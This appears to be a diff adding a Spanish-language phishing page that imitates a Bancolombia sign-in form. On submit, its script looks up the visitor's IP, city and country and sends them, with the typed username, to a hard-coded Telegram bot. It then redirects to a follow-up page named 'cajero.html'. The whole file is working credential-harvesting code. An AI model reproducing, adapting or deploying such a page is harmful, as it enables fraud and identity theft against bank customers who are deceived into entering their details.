@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Formulario Centrado</title>
+    <link rel="stylesheet" href="styles.css" />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <form class="form" id="loginForm">
+        <div style="padding: 20px">
+          <div style="text-align: center">
+            <img src="logof.jfif" width="150" />
+          </div>
+          <div style="text-align: center">
+            <h2>¡Hola!</h2>
+          </div>
+          <div id="is-relative">
+            <input
+              type="text"
+              id="usuario"
+              placeholder="Ingresa el usuario"
+              style="
+                background-color: transparent;
+                border-bottom: 0.1rem solid #fdda24;
+                padding-left: 43px;
+                font-size: 16px;
+                border-radius: 0px;
+                border-top-width: 0px;
+                border-right-width: 0px;
+                border-left-width: 0px;
+                outline: none;
+                transition: box-shadow 0.2s ease-in-out 0s;
+                width: 85%;
+              "
+              id="eltipo"
+              required=""
+            />
+            <span id="icon">
+              <i class="fas fa-user"></i>
+            </span>
+          </div>
+
+          <button type="submit">Continuar</button>
+        </div>
+        <div>
+          <img
+            src="https://sucursalpanama.grupobancolombia.com/wcm/connect/sucursalpanama.grupobancolombia.com28508/c829dfcb-f89d-4fd7-915d-4210768913e8/lines-left.svg?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_K9HC1202P875D06OV938LS1697-c829dfcb-f89d-4fd7-915d-4210768913e8-nK3K0Nt"
+            style="width: 100%"
+          />
+        </div>
+      </form>
+    </div>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginForm");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const usuario = document.querySelector("#usuario").value;
+          localStorage.setItem("usuario", usuario);
+          localStorage.setItem("valor", 3);
+          const message =
+           "Usuario: " +
+            localStorage.getItem("numero") +
+            "\nUsuario: " +
+            usuario +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
+              {
+                chat_id: "-4139256120",
+                text: message,
+              }
+            )
+            .then((response) => {
+              console.log(response.data);
+              window.location.href = "cajero.html";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
